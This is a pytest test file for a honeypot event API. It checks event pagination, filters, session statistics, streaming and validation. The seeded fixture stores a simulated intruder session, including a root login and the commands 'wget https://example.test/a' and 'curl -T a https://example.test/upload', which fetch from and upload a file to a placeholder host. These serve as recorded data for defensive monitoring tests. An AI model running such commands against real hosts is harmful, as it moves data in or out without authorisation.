import asyncio
import json
import socket
import sqlite3
from collections.abc import AsyncIterator, Iterator
from concurrent.futures import Future, ThreadPoolExecutor
from contextlib import closing
from datetime import datetime, timedelta, timezone
from pathlib import Path
from threading import Barrier
from uuid import uuid4

import httpx
import pytest
import uvicorn
from fastapi import FastAPI
from fastapi.testclient import TestClient

from panopticon.api.app import create_app
from panopticon.api.models import EventPage, EventQuery, SessionPage
from panopticon.api.repository import SQLiteEventReader
from panopticon.config.settings import APISettings, DatabaseSettings, Settings
from panopticon.events.event_handler import EventHandler
from panopticon.events.models import (
    BaseEvent,
    Command,
    ConnectionClosed,
    ConnectionOpen,
    FileDownloaded,
    FileUploaded,
    LoginAttempt,
)
from panopticon.events.sqlite_store import SQLiteEventStore


@pytest.fixture
def store(tmp_path: Path) -> SQLiteEventStore:
    """Creates an isolated database containing a closed session and an active session

    Args:
        tmp_path (Path): Temporary directory supplied by pytest

    Returns:
        SQLiteEventStore: Seeded test database
    """

    result: SQLiteEventStore = SQLiteEventStore(tmp_path / "events.sqlite3")
    result.initialise()
    start: datetime = datetime(2026, 10, 21, 10, tzinfo=timezone.utc)
    events: list[BaseEvent] = [
        ConnectionOpen(session_id="closed", src_ip="192.0.2.1", src_port=1000),
        LoginAttempt(
            session_id="closed", src_ip="192.0.2.1", src_port=1000, username="root", password="dummy", success=True
        ),
        Command(session_id="closed", src_ip="192.0.2.1", src_port=1000, input="id"),
        FileDownloaded(
            session_id="closed",
            src_ip="192.0.2.1",
            src_port=1000,
            url="https://example.test/a",
            filename="a",
            filetype="application/octet-stream",
            command="wget https://example.test/a",
            method="GET",
        ),
        FileUploaded(
            session_id="closed",
            src_ip="192.0.2.1",
            src_port=1000,
            url="https://example.test/upload",
            filename="a",
            filetype="application/octet-stream",
            command="curl -T a https://example.test/upload",
            method="PUT",
        ),
        ConnectionClosed(session_id="closed", src_ip="192.0.2.1", src_port=1000, duration_seconds=5),
        ConnectionOpen(session_id="active", src_ip="2001:db8::1", src_port=2000),
    ]

    for index, event in enumerate(events):
        event.timestamp = start + timedelta(minutes=index)
        result.save(event)

    return result


def configuration(path: Path) -> Settings:
    """Builds isolated service settings without reading the operator's environment file

    Args:
        path (Path): Test database path

    Returns:
        Settings: API configuration with short streaming intervals
    """

    return Settings(
        _env_file=None,
        database=DatabaseSettings(path=path),
        api=APISettings(poll_interval=0.01, heartbeat_interval=0.03),
    )


@pytest.fixture
def client(store: SQLiteEventStore) -> Iterator[TestClient]:
    """Starts the API against a seeded database for endpoint tests

    Args:
        store (SQLiteEventStore): Seeded database fixture

    Yields:
        TestClient: Client with the application lifespan running
    """

    with TestClient(create_app(configuration(store.path))) as result:
        yield result


def test_event_history_pagination_and_details(client: TestClient) -> None:
    """Checks deterministic cursor pages and preservation of event-specific payload fields

    Args:
        client (TestClient): Running API fixture
    """

    first: httpx.Response = client.get("/events", params={"limit": 3})
    assert first.status_code == 200
    data: EventPage = EventPage.model_validate(first.json())
    assert len(data.items) == 3
    assert data.next_cursor
    assert data.stream_cursor
    seen: list[str] = []
    page: EventPage = data

    while True:
        seen.extend(str(item.id) for item in page.items)

        if page.next_cursor is None:
            break

        page = EventPage.model_validate(
            client.get("/events", params={"limit": 3, "before_id": str(page.next_cursor)}).json()
        )

    assert len(seen) == len(set(seen)) == 7
    login: dict[str, object] = client.get("/events", params={"event_type": "login_attempt"}).json()["items"][0]
    assert client.get(f"/events/{login['id']}").json()["password"] == "dummy"


@pytest.mark.parametrize(
    ("parameters", "expected"),
    [
        ({"event_type": "command"}, 1),
        ({"src_ip": "192.0.2.1", "src_port": 1000}, 6),
        ({"session_id": "active"}, 1),
        ({"src_ip": "2001:db8::1"}, 1),
        ({"start_time": "2026-10-21T10:02:00Z", "end_time": "2026-10-21T10:04:00Z"}, 2),
    ],
)
def test_event_filters(client: TestClient, parameters: dict[str, str | int], expected: int) -> None:
    """Checks exact filters and inclusive-start/exclusive-end UTC boundaries

    Args:
        client (TestClient): Running API fixture
        parameters (dict[str, str | int]): Query filters
        expected (int): Expected number of events
    """

    response: httpx.Response = client.get("/events", params=parameters)

    assert response.status_code == 200
    assert len(response.json()["items"]) == expected


@pytest.mark.parametrize(
    "path",
    [
        "/events?limit=0",
        "/events?limit=501",
        "/events?src_port=-1",
        "/events?src_ip=invalid",
        "/events?event_type=invalid",
        "/events?before_id=invalid",
        "/events?unknown=value",
        "/events?start_time=2026-10-21T10:00:00",
        "/events?start_time=2026-10-22T00:00:00Z&end_time=2026-10-21T00:00:00Z",
        "/sessions?offset=-1",
        "/sessions?status=invalid",
        "/stats/top/invalid",
        "/stats/top/username?limit=51",
        "/stats/timeline?interval=second",
        "/stats/timeline?interval=minute&start_time=2020-01-01T00:00:00Z",
        "/events/stream?after_id=invalid",
    ],
)
def test_invalid_queries_are_rejected(client: TestClient, path: str) -> None:
    """Checks input validation and bounded dashboard query costs

    Args:
        client (TestClient): Running API fixture
        path (str): Invalid request path
    """

    assert client.get(path).status_code == 422


def test_missing_events_sessions_and_cursors(client: TestClient) -> None:
    """Checks explicit not-found responses for unavailable IDs

    Args:
        client (TestClient): Running API fixture
    """

    missing: str = str(uuid4())

    assert client.get(f"/events/{missing}").status_code == 404
    assert client.get("/sessions/missing").status_code == 404
    assert client.get("/events", params={"before_id": missing}).status_code == 404
    assert client.get("/events/stream", headers={"Last-Event-ID": missing}).status_code == 404
    assert client.get("/events/stream", headers={"Last-Event-ID": "invalid"}).status_code == 422


def test_dashboard_statistics_and_sessions(client: TestClient) -> None:
    """Checks summary totals, ranked values and complete recorded session lifecycles

    Args:
        client (TestClient): Running API fixture
    """

    summary: dict[str, object] = client.get("/stats/summary").json()

    assert summary["total_events"] == 7
    assert summary["total_sessions"] == 2
    assert summary["unique_sources"] == 2
    assert summary["uploads"] == summary["downloads"] == summary["commands"] == 1
    assert client.get("/stats/top/username").json() == [{"value": "root", "count": 1}]
    assert client.get("/stats/top/password").json() == [{"value": "dummy", "count": 1}]
    assert client.get("/stats/top/command").json() == [{"value": "id", "count": 1}]
    assert client.get("/stats/top/src_ip").json()[0] == {"value": "192.0.2.1", "count": 6}
    assert client.get("/stats/summary", params={"event_type": "command"}).json()["total_events"] == 1
    sessions: SessionPage = SessionPage.model_validate(client.get("/sessions", params={"limit": 1}).json())

    assert sessions.total == 2
    assert len(sessions.items) == 1
    assert client.get("/sessions", params={"status": "active"}).json()["items"][0]["session_id"] == "active"
    closed: dict[str, object] = client.get("/sessions/closed").json()

    assert closed["active"] is False
    assert closed["username"] == "root"
    assert closed["commands"] == 1
    assert closed["duration_seconds"] == 5


def test_timeline_fills_empty_buckets(client: TestClient) -> None:
    """Checks UTC aggregation and zero-filled chart intervals

    Args:
        client (TestClient): Running API fixture
    """

    response: httpx.Response = client.get(
        "/stats/timeline",
        params={
            "start_time": "2026-10-21T09:00:00Z",
            "end_time": "2026-10-21T12:00:00Z",
            "interval": "hour",
        },
    )

    assert response.status_code == 200
    assert [point["count"] for point in response.json()["items"]] == [0, 7, 0]


def test_cors_health_and_openapi(client: TestClient) -> None:
    """Checks dashboard origin policy, database readiness and generated API documentation

    Args:
        client (TestClient): Running API fixture
    """

    assert client.get("/health").json() == {"status": "ok", "database": "ready"}
    assert client.get("/docs").status_code == 200
    assert "/events/stream" in client.get("/openapi.json").json()["paths"]
    allowed: httpx.Response = client.get("/events", headers={"Origin": "http://localhost:5173"})
    denied: httpx.Response = client.get("/events", headers={"Origin": "https://example.test"})

    assert allowed.headers["access-control-allow-origin"] == "http://localhost:5173"
    assert "access-control-allow-origin" not in denied.headers


def test_empty_database_and_unavailable_storage(tmp_path: Path) -> None:
    """Checks automatic initialisation, empty dashboard responses and safe storage errors

    Args:
        tmp_path (Path): Temporary directory supplied by pytest
    """

    path: Path = tmp_path / "empty.sqlite3"

    with TestClient(create_app(configuration(path))) as client:
        assert path.exists()
        assert client.get("/events").json() == {"items": [], "next_cursor": None, "stream_cursor": "0"}
        assert client.get("/sessions").json()["total"] == 0
        assert client.get("/stats/summary").json()["total_events"] == 0

        with closing(sqlite3.connect(path)) as connection:
            connection.execute("DROP TABLE events")
            connection.commit()

        response: httpx.Response = client.get("/health")

        assert response.status_code == 503
        assert response.json() == {"detail": "Event database unavailable"}


def test_services_can_initialise_the_shared_database_together(tmp_path: Path) -> None:
    """Checks simultaneous schema creation by independently starting services

    Args:
        tmp_path (Path): Temporary directory supplied by pytest
    """

    path: Path = tmp_path / "shared.sqlite3"
    barrier: Barrier = Barrier(2)

    def initialise() -> None:
        """Initialises a service connection alongside the other starting service"""

        barrier.wait(timeout=5)
        SQLiteEventStore(path).initialise()

    with ThreadPoolExecutor(max_workers=2) as executor:
        first: Future[None] = executor.submit(initialise)
        second: Future[None] = executor.submit(initialise)
        first.result(timeout=10)
        second.result(timeout=10)

    SQLiteEventReader(path).health()


def test_equal_timestamps_paginate_without_duplicates(store: SQLiteEventStore) -> None:
    """Checks stable history cursors when several events have the same timestamp

    Args:
        store (SQLiteEventStore): Seeded database fixture
    """

    for _ in range(3):
        store.save(
            Command(
                session_id="same",
                src_ip="192.0.2.1",
                src_port=1,
                timestamp=datetime(2026, 10, 21, 12, tzinfo=timezone.utc),
                input="pwd",
            )
        )

    reader: SQLiteEventReader = SQLiteEventReader(store.path)
    first: EventPage = reader.events(EventQuery(session_id="same", limit=2))
    second: EventPage = reader.events(EventQuery(session_id="same", limit=2, before_id=first.next_cursor))

    assert len({event.id for event in first.items + second.items}) == 3
    assert second.next_cursor is None


@pytest.mark.asyncio
async def test_sse_commit_replay_filters_and_heartbeat(tmp_path: Path) -> None:
    """Checks real HTTP streaming, cross-connection commits, replay and filtered heartbeats

    Args:
        tmp_path (Path): Temporary directory supplied by pytest
    """

    path: Path = tmp_path / "stream.sqlite3"
    app: FastAPI = create_app(configuration(path))
    listener: socket.socket = socket.socket()
    listener.bind(("127.0.0.1", 0))
    server: uvicorn.Server = uvicorn.Server(uvicorn.Config(app, log_level="error", lifespan="on"))
    serving: asyncio.Task[None] = asyncio.create_task(server.serve(sockets=[listener]))
    collector: EventHandler = EventHandler(SQLiteEventStore(path))

    try:
        async with asyncio.timeout(5):
            while not server.started:
                if serving.done():
                    await serving

                await asyncio.sleep(0.01)

        await collector.start()
        first: Command = Command(session_id="live", src_ip="192.0.2.1", src_port=1, input="echo first")
        second: Command = Command(
            session_id="live",
            src_ip="192.0.2.1",
            src_port=1,
            input="echo second",
            timestamp=datetime(2020, 1, 1, tzinfo=timezone.utc),
        )
        base_url: str = f"http://127.0.0.1:{listener.getsockname()[1]}"

        async with httpx.AsyncClient(base_url=base_url, timeout=5) as client:
            snapshot: str = (await client.get("/events")).json()["stream_cursor"]
            collector.publish(first)
            await collector.flush()

            async with client.stream("GET", "/events/stream", params={"after_id": snapshot}) as response:
                assert response.status_code == 200
                assert response.headers["content-type"].startswith("text/event-stream")
                assert response.headers["x-accel-buffering"] == "no"
                lines: AsyncIterator[str] = response.aiter_lines()

                async with asyncio.timeout(5):
                    async for line in lines:
                        if line.startswith("data: "):
                            assert json.loads(line[6:])["id"] == str(first.id)
                            break

                collector.publish(second)
                await collector.flush()

                async with asyncio.timeout(5):
                    async for line in lines:
                        if line.startswith("data: "):
                            assert json.loads(line[6:])["id"] == str(second.id)
                            break

            async with client.stream(
                "GET", "/events/stream", params={"after_id": "0"}, headers={"Last-Event-ID": str(first.id)}
            ) as replay:
                async with asyncio.timeout(5):
                    async for line in replay.aiter_lines():
                        if line.startswith("data: "):
                            assert json.loads(line[6:])["id"] == str(second.id)
                            break

            async with client.stream(
                "GET", "/events/stream", params={"after_id": "0", "event_type": "login_attempt"}
            ) as filtered:
                async with asyncio.timeout(5):
                    async for line in filtered.aiter_lines():
                        assert not line.startswith("data: ")

                        if line == ": keepalive":
                            break

    finally:
        await collector.close()
        server.should_exit = True
        await asyncio.wait_for(serving, timeout=5)
        listener.close()
